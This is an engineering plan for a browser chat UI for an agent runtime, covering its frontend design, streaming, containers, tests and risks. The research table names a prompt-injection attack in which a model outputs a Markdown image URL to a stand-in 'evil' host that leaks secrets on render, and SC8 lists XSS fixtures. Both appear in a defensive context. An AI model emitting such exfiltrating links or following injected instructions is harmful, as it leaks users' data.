# Phase L2 plan — Chat UI (milestone M1: it works in the browser)

**Goal:** after `./setup.sh`, a person opens `http://localhost:3000` and chats with the built-in agent. They see:
- replies stream in;
- tool calls as cards, sub-agents with live progress;
- an approval card when a tool needs a human;
- a stop button.

It survives a page reload, a lost connection, an API restart and a worker crash, without a duplicate or missing message. **It needs only Docker**, like L1.

**Part of:** the [local release](local-release.md), re-ordered so the chat UI comes before the Studio ([roadmap](../roadmap.md)). **Requirements:**
- R12.11, the chat view;
- R6.5, the engineering standard;
- **AC20**, resume the conversation;
- CR-006 G3, untrusted content in rendering.

---

## 1. Research findings

| Topic | Finding | Consequence |
|---|---|---|
| Versions (npm registry, 2026-10-17, ≥ 2 weeks old) | React 19.3.0, Vite 8.3.2, @vitejs/plugin-react 6.1.1, Tailwind 4.3.3, TanStack Query 5.104.1, Vitest 5.0.3, Testing Library 16.3.3, Playwright 1.63.0, ESLint 10.12.0, typescript-eslint 8.71.0, openapi-typescript 7.13.0 + openapi-fetch 0.17.0, react-markdown 10.1.0, rehype-sanitize 6.0.0 | Pinned exactly in the lockfile |
| **TypeScript 7** (the native compiler, 2026-07) | typescript-eslint 8.71 supports `typescript <6.1`; openapi-typescript asks for `^5` | **TypeScript 6.0.3**; move to 7 when the lint tooling supports it |
| **React 18 in R6.5** | R6.5 was written when 18 was current. 19 is the current major, and 18 gets no more releases | **React 19.** A recorded deviation from R6.5's letter (its intent is a current, typed React) |
| No Node on this machine; testers have only Docker | The UI's toolchain can run in a pinned `node:24` container, like the runtime's Python in its image | `make ui-*` runs pnpm in a container; nothing is installed on the host. Contributors with Node can run it natively |
| Supply chain for npm | pnpm ≥ 10 blocks dependency install scripts by default; `minimumReleaseAge` delays new versions (a rolling cooldown, as `exclude-newer` does for uv); Corepack verifies the pnpm binary by hash (`packageManager` field) | pnpm 12.9.0 via Corepack; `minimumReleaseAge: 20160` (14 days); `--frozen-lockfile` in CI and in the image build |
| SSE in the browser | `EventSource` reconnects by itself and sends `Last-Event-ID`; it can't set headers on a *new* connection, but our API also takes `?after_seq=` | A new connection (page load, `event: reconnect` on a drain) uses `after_seq`; the browser's own reconnects use `Last-Event-ID` |
| **The stream has no "turn ended" signal** | The session stream sends `message.created` (persisted), `token` and `subagent.*` (transient). A turn's end is only visible by polling `GET /sessions/{id}`; `runtime chat` knows because it runs the turn in-process | **Backend addition:** a transient `turn.status` event on the session channel for each of the turn's lifecycle events. Transient events are at-most-once, so the UI also re-reads the session on every (re)connect and every 10 s while a turn is active (a safety net, as the server's own stream does) |
| **The offline demo model doesn't answer free text** | The scripted model needs a script. Typed text gets "(script finished)" | **Backend addition:** a deterministic **demo responder** for `MODEL_PROVIDER=scripted` when no script is sent. It picks a script from the user's words (calculator, note, search, sub-agents, notify → approval, else an explanation of how to connect a model). It streams word by word, so tokens are visible. The same input gives the same reply, so crash replay stays exact. Browser tests drive everything through it |
| Markdown from a model is untrusted (G3) | react-markdown doesn't render raw HTML by default; `rehype-sanitize` is the second wall. **Images in model output are a known exfiltration channel** (a prompt-injected `![](https://evil/?q=secret)` leaks data as soon as it renders) | No raw HTML; sanitised; **images are not loaded** (shown as links); links get `rel="noopener noreferrer nofollow"` and `target=_blank`; a strict CSP blocks anything that slips through |
| Serving the UI | Unprivileged nginx serves the static build and proxies `/api/` to the API: one origin, so no CORS. `proxy_buffering off` for SSE. nginx ≥ 1.27.3 re-resolves upstream DNS (`server … resolve`), so the proxy follows API containers that restart or scale | `nginxinc/nginx-unprivileged:1.30.6-alpine`, digest-pinned |
| **AC20** needs two API replicas | "Kill the API replica serving the stream; the UI reconnects to another replica." With one replica and a published port, Compose can't scale the API | The API runs as **2 replicas behind the UI's proxy**, and its host port goes. Testers and tools reach it through `http://localhost:3000/api/`; the API docs are proxied at `/docs`. Setup, smoke, doctor and the container e2e move to the proxied URL |
| Browser tests against containers | The Playwright image (`mcr.microsoft.com/playwright:v1.63.0-noble`) has the browsers. It can join the Compose network, so no browser is installed on the host | `make ui-e2e` runs Playwright in that image against the running stack; in CI too. `@axe-core/playwright` checks accessibility |
| Client from the OpenAPI spec (R6.5) | openapi-typescript generates types only, and openapi-fetch is a 6 kB typed `fetch`. There's no runtime codegen, and the API's own spec is the source | `runtime openapi` writes the spec; `make ui-api` regenerates `src/api/schema.d.ts`; **CI fails if the committed types drift from the API** |

## 2. Design

```
 browser ──► ui (nginx, :3000 on 127.0.0.1) ──┬─ /            static build (hashed assets: immutable; index.html: no-cache)
                                               ├─ /api/…  ──► api ×2 (round robin, DNS re-resolved; SSE unbuffered)
                                               └─ /docs, /openapi.json ──► api
 api ×2 ──► Postgres, Redis ◄── worker ×2
```

### 2.1 Frontend (`frontend/`)

```
src/
  api/          schema.d.ts (generated), client.ts (openapi-fetch + problem+json errors)
  stream/       sessionStream.ts (EventSource adapter), useSessionStream.ts (hook), connection.ts (state machine)
  chat/         transcript.ts (pure reducer), selectors.ts, ChatView, MessageList, Composer,
                AssistantMessage, ToolCard, SubagentCard, ApprovalCard, StopButton, WhatHappened
  sessions/     SessionsSidebar, NewSession (agent picker), queries.ts (TanStack Query)
  ui/           Markdown (safe), Button, Badge, Spinner, Toast, ErrorBoundary
  App.tsx, main.tsx
```

**Patterns (named in `docs/design.md`):**
- **Reducer / event sourcing:** the visible transcript is a fold over events. `transcript(state, event)` is a pure function. It's idempotent by `seq` and `message_id`, so a replayed or doubled event changes nothing; this is the client half of "exactly-once display".
- **State machine** for the connection: `connecting → open → reconnecting → open`, plus `draining → connecting` and `closed`. The UI shows it as one plain banner.
- **Adapter:** `sessionStream.ts` hides `EventSource` behind `subscribe(sessionId, afterSeq, handlers)`. The reducer never sees the browser API, and tests feed it plain events.
- **Observer:** the hook subscribes components to the stream. It is the only place with side effects, the imperative shell around the pure reducer (functional core).
- **Container / presentational components:** `ChatView` wires the data; cards and messages are pure props → markup, unit-tested.
- **Server state vs. live state:** TanStack Query owns the REST data (sessions, agents, the first transcript page) with cache invalidation; the reducer owns the live transcript.

**Behaviour:**
- **Tokens** build a *draft* reply. When the reply's `assistant` message arrives (persisted), it replaces the draft. A cancel keeps the partial reply, which the server persists as `interrupted`.
- **Tool calls** pair `tool_call` and `tool_result` by `tool_call_id` into one card (arguments, result or error, duration, "cached").
- **Sub-agents:** a card per handle (agent, status, latest progress and percent, elapsed time, result), from `subagent.*`.
- **Approvals:** an `interrupt` message shows the approval card (tool, arguments, Approve / Reject with a reason); it disappears when the `approval` message arrives. After a reload it reappears from the transcript.
- **Stop** shows while a turn is active and posts `/cancel`.
- **"What happened?"** per turn: the run's events (`GET /runs/{id}/events`), its usage and cost, in plain words.
- **Plain words:** "Thinking…", "Using the calculator", "Helper: researcher". No "run", "epoch" or "lease" on the main screen.
- **Accessibility:**
  - every control is keyboard-usable, with visible focus;
  - an `aria-live` region announces a finished reply;
  - colours meet WCAG AA;
  - the app respects `prefers-reduced-motion` and dark mode.

### 2.2 Backend additions (small)
1. **`turn.status`** (transient, on the session channel): `{run_id, status, reason}`, published after commit from the run's lifecycle events (started, waiting for approval, resumed, released, reclaimed, and the terminal ones). It's an Observer next to the existing sub-agent relay, in one place: the executor's and the session service's post-commit publish.
2. **Demo responder** (`models/demo.py`): `demo_script(user_text) → list[ScriptTurn]`, used when the provider is `scripted` and the request has no script.
   - **Pattern:** Strategy, a table of rules matched in order.
   - **Deterministic,** so crash replay is exact.
   - The compose stack sets `SCRIPTED_STREAMING=true` with a short per-word delay, so tokens visibly stream.
3. **`runtime openapi`:** prints the spec, for codegen and the drift check.

### 2.3 Container and setup
- **`frontend/Dockerfile`:**
  - **Builder:** `node:24` (digest-pinned); Corepack pnpm; `pnpm install --frozen-lockfile`; `pnpm build`.
  - **Runtime:** `nginx-unprivileged` (UID 101, read-only, a tmpfs for nginx's temp dirs). It copies only `dist/` and the nginx config.
- **nginx config:**
  - **Security headers:** a strict CSP (`default-src 'self'`; no inline script; `img-src 'self' data:`; `connect-src 'self'`; `frame-ancestors 'none'`), `X-Content-Type-Options`, `Referrer-Policy: no-referrer`.
  - **The SSE location:** `proxy_buffering off`, `proxy_read_timeout 1h`, and HTTP/1.1 keep-alive to the upstream.
  - `gzip` for static assets; a `/healthz` for the container.
- **Compose:**
  - `ui` in the `app` profile, on `127.0.0.1:${UI_PORT:-3000}:8080`, depending on a healthy `api`;
  - `api` gets `replicas: ${API_REPLICAS:-2}` and no host port.
- **`setup.sh` / `setup.ps1`:**
  - the UI port joins the free-port check;
  - smoke, doctor and chat go through `http://ui:8080/api`;
  - the smoke test also checks that the UI serves its page;
  - the end message is "**Open http://localhost:3000**", and an interactive run opens the browser.
- **Release:** the `ui` image is published multi-arch next to `runtime`.

## 3. Tasks

| # | Task | Verification |
|---|---|---|
| L2.1 | Backend: `turn.status` relay; demo responder; `runtime openapi`; streaming demo settings | Unit + integration tests; existing suites green |
| L2.2 | `frontend/` scaffold: Vite + React 19 + TS strict + Tailwind; ESLint (typescript-eslint strict, react-hooks); Vitest; pnpm with the cooldown; `make ui-*` in a node container | `make ui-check` green (lint, types, tests, build) |
| L2.3 | API client: generated types, `client.ts`, problem+json errors; the drift check | A changed schema fails the check |
| L2.4 | The stream: the EventSource adapter, the connection state machine, `useSessionStream`; the transcript reducer and selectors | Vitest: idempotent replay, duplicates, out-of-order back-fill, token draft → final reply, interrupted reply, tool pairing, sub-agent cards, approvals; reducer coverage ≥ 90 % |
| L2.5 | Chat UI: sidebar, new session (agent picker), messages, safe Markdown, tool / sub-agent / approval cards, composer, stop, connection banner, "What happened?" | Component tests; XSS fixtures render as text; images not loaded |
| L2.6 | `ui` image, nginx config, Compose (`ui`, `api` ×2 behind it), setup changes, release workflow | Image non-root and read-only; Trivy clean; CSP present; `./setup.sh` from scratch opens a working chat |
| L2.7 | Playwright e2e against the Compose stack (§4), run in the Playwright container; `make ui-e2e` | 5× locally; in CI |
| L2.8 | Container e2e and CI updated (proxied API; `frontend` job: lint, types, tests, build, drift check; the containers job adds the UI image, its scan, Playwright) | Green PR |
| L2.9 | Docs: README "Try it" with the browser, `docs/setup/` updated, a screenshot; `docs/design.md` patterns; summary | A clean clone followed only through the docs |

## 4. Success criteria

| # | Criterion | How | Pass when |
|---|---|---|---|
| SC1 | **Clone → chatting in the browser** | Fresh clone, `./setup.sh --non-interactive --model scripted`, open the printed URL (Playwright) | A reply streams in; setup's smoke checks the UI too; cold and warm times recorded |
| SC2 | **Streaming you can see** | The demo responder (scripted, streaming), and the live Ollama model | The first words are visible before the reply completes; no flicker or duplicate when the final message replaces the draft |
| SC3 | **AC20: resume the conversation** | Mid-reply: (a) reload the page; (b) `docker kill` the API replica serving the stream; (c) `docker stop` it (drain → `event: reconnect`) | The UI reconnects (to the other replica), and the final transcript equals an undisturbed run's: same message ids, in order, none duplicated or missing; **5/5 each** |
| SC4 | **A worker crash, seen from the browser** | `docker kill` the worker running the turn, mid tool call | The turn completes; one tool card, one note; no duplicate messages; **5/5** |
| SC5 | **Approval in the browser** | "notify …" → approval card → reload → Approve (and a Reject run) | The card survives the reload; approve runs the tool once; reject shows the refusal; **5/5** |
| SC6 | **Stop** | Stop mid-reply | The turn stops within 2 s; the partial reply stays, marked as stopped; the next message works; **5/5** |
| SC7 | **Sub-agents live** | The demo "research …" turn (two helpers in parallel) | Two helper cards with live progress, then their results, then the combined answer; **5/5** |
| SC8 | **Untrusted content is inert** | Fixtures through the real pipeline: `<script>`, `<img onerror>`, `javascript:` links, a Markdown image to an external URL, in assistant text and tool results | Nothing executes; **zero requests to the external URL** (Playwright network log); a CSP header on every response |
| SC9 | **Code quality** | CI | `tsc --strict`, ESLint (no warnings), Vitest (reducer coverage ≥ 90 %), the OpenAPI drift check; backend `make check` green |
| SC10 | **A sound UI image** | Inspect + Trivy | Non-root, read-only root filesystem; no fixable HIGH/CRITICAL; size recorded; multi-arch on a tag |
| SC11 | **Accessible** | axe (Playwright) on the main screens; keyboard-only flow | Zero serious or critical violations; send, stop and approve work from the keyboard |
| SC12 | Setup and docs | Re-run setup; follow the docs on a clean clone | Still idempotent; the UI port is chosen like the others; docs need no unwritten step |

## 5. Risks

| Risk | Mitigation |
|---|---|
| A transient `turn.status` is lost (Pub/Sub is at-most-once) | The UI re-reads the session on every (re)connect and every 10 s during a turn; the transcript itself is persisted and replayed |
| SSE through a proxy gets buffered or cut | `proxy_buffering off`, long read timeout, the server's 15 s pings; SC3 exercises it |
| Two API replicas break something that assumed one | Phase 3 proved replica-independent streaming (AC3); SC3 runs every scenario with two |
| The demo responder drifts into a fake product | It is labelled "Demo model" in the UI, explains how to connect a real one, and exists only for the scripted provider |
| Moving the API behind the proxy breaks someone's habit (`:8000/docs`) | The docs and setup's final message point to `localhost:3000/docs`; `make api` for contributors is unchanged |
| The frontend toolchain in a container is slow on macOS | A named volume for `node_modules` and the pnpm store; native Node works too |
